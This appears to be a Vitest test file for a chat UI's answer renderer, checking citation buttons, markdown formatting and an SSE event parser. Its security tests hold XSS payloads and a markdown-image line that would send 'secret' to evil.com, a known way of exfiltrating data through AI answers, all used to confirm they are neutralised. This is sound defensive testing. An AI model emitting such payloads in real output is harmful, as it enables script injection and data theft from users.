import { afterEach, describe, expect, it, vi } from "vitest";
import { cleanup, fireEvent, render } from "@testing-library/react";
import { AnswerText } from "../../src/web/AnswerText";
import { sseParser, type ChatEvent } from "../../src/web/api";

afterEach(cleanup);

const renderText = (text: string, nums = [1, 2, 3, 4]) => {
  const onCite = vi.fn();
  const view = render(<AnswerText text={text} sourceNumbers={new Set(nums)} onCite={onCite} />);
  return { ...view, onCite };
};

describe("safe answer rendering (SECURITY §7.3, §13 #11, #17)", () => {
  it("shows raw HTML as text and never creates elements from it", () => {
    const { container } = renderText('<img src=x onerror=alert(1)> and <script>alert("x")</script> [1]');
    expect(container.querySelector("img, script, iframe")).toBeNull();
    expect(container.textContent).toContain("<img src=x onerror=alert(1)>");
    expect(container.textContent).toContain('<script>alert("x")</script>');
  });

  it("drops markdown images, so nothing loads from another site", () => {
    const { container } = renderText("Result ![](https://evil.com/x?d=secret) here [1].");
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.com");
  });

  it("keeps only the label of model links, never the URL", () => {
    const { container } = renderText("See [click me](javascript:alert(1)) and [site](https://evil.com).");
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toBe("See click me and site.");
  });

  it("turns [n] into citation buttons, including groups and ranges", () => {
    const { getAllByRole, onCite } = renderText("PLA composts [1][2] and degrades [3-4].");
    const buttons = getAllByRole("button");
    expect(buttons.map((b) => b.getAttribute("aria-label"))).toEqual([
      "Source 1",
      "Source 2",
      "Source 3",
      "Source 4",
    ]);
    fireEvent.click(buttons[2]!);
    expect(onCite).toHaveBeenCalledWith(3, buttons[2]);
  });

  it("leaves citations to unknown sources as plain text", () => {
    const { queryAllByRole, container } = renderText("Claim [9].", [1]);
    expect(queryAllByRole("button")).toHaveLength(0);
    expect(container.textContent).toBe("Claim [9].");
  });

  it("renders paragraphs, lists, bold, italic and code", () => {
    const { container } = renderText(
      "## Summary\n\nIntro **bold** and *it* `x`.\n\n- one [1]\n- two\n\n1. first\n2. second",
    );
    expect(container.querySelectorAll("p")).toHaveLength(2);
    expect(container.querySelector("p")!.className).toContain("font-semibold");
    expect(container.querySelector("strong")!.textContent).toBe("bold");
    expect(container.querySelector("em")!.textContent).toBe("it");
    expect(container.querySelector("code")!.textContent).toBe("x");
    expect(container.querySelectorAll("ul li")).toHaveLength(2);
    expect(container.querySelectorAll("ol li")).toHaveLength(2);
  });
});

describe("SSE parser", () => {
  it("handles events split across network chunks and ignores junk", () => {
    const events: ChatEvent[] = [];
    const feed = sseParser((e) => events.push(e));
    feed('event: status\ndata: {"type":"status","step":"sear');
    feed('ching"}\n\nevent: token\ndata: {"type":"token","text":"Hi"}\n');
    feed('\ndata: not json\n\nevent: token\r\ndata: {"type":"token","text":"!"}\r\n\r\n');
    expect(events).toEqual([
      { type: "status", step: "searching" },
      { type: "token", text: "Hi" },
      { type: "token", text: "!" },
    ]);
  });
});
